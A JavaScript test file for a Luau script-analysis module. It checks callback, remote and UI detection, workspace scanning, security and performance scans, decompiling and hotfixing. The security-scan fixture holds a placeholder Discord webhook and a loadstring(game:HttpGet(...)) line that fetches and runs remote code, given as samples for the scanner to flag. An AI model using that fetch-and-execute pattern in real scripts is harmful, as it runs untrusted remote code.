import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import {
  analyzeLuauText,
  buildLuauDependencyMap,
  compareLuauFiles,
  decompileLuauHeuristics,
  hotfixLuauText,
  profileLuauPerformance,
  scanLuauSecurity,
  scanLuauWorkspace,
} from '../src/luau.mjs';

test('luau analysis finds callbacks, remotes, ui, state, and risks', () => {
  const report = analyzeLuauText(`
    local Settings = {}
    local Remote = game.ReplicatedStorage.RemoteEvent
    Remote:FireServer("hello")
    RunService.Heartbeat:Connect(function()
      print("tick")
    end)
    local Window = Library:Window("Main")
    while true do
      wait()
      break
    end
  `, 'scripts/main.luau');

  assert.equal(report.summary.callbackCount > 0, true);
  assert.equal(report.summary.remoteCount > 0, true);
  assert.equal(report.summary.uiCount > 0, true);
  assert.equal(report.summary.stateCount > 0, true);
  assert.equal(report.summary.riskCount > 0, true);
});

test('luau scan and compare work on a workspace', () => {
  const root = mkdtempSync(path.join(tmpdir(), 'helper-mcp-luau-'));
  try {
    const current = path.join(root, 'current.luau');
    const baseline = path.join(root, 'baseline.luau');
    const moduleFile = path.join(root, 'module.luau');
    writeFileSync(current, 'local Settings = {}\nRemoteEvent:FireServer()\n', 'utf8');
    writeFileSync(baseline, 'local Settings = {}\n', 'utf8');
    writeFileSync(moduleFile, 'return function() end\n', 'utf8');

    const scan = scanLuauWorkspace(root);
    assert.equal(scan.totalFiles, 3);

    const compare = compareLuauFiles(root, current, baseline);
    assert.equal(compare.added.length > 0, true);

    const security = scanLuauSecurity('local webhook = "https://discord.com/api/webhooks/123/abc"\nloadstring(game:HttpGet("https://example.com"))\n', 'security.luau');
    assert.equal(security.summary.findingCount > 0, true);

    const perf = profileLuauPerformance('while true do\n wait()\nend\n', 'perf.luau');
    assert.equal(perf.summary.findingCount > 0, true);

    const decompiled = decompileLuauHeuristics('local a = string.char(65, 66)\nlocal b = loadstring("print(1)")\n', 'obfuscated.luau');
    assert.equal(decompiled.summary.findingCount > 0, true);

    const dependency = buildLuauDependencyMap(root);
    assert.equal(dependency.summary.scriptCount >= 3, true);

    const hotfixed = hotfixLuauText('RemoteEvent:FireServer("hello")\n', 'hotfix.luau');
    assert.equal(hotfixed.summary.changed, true);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
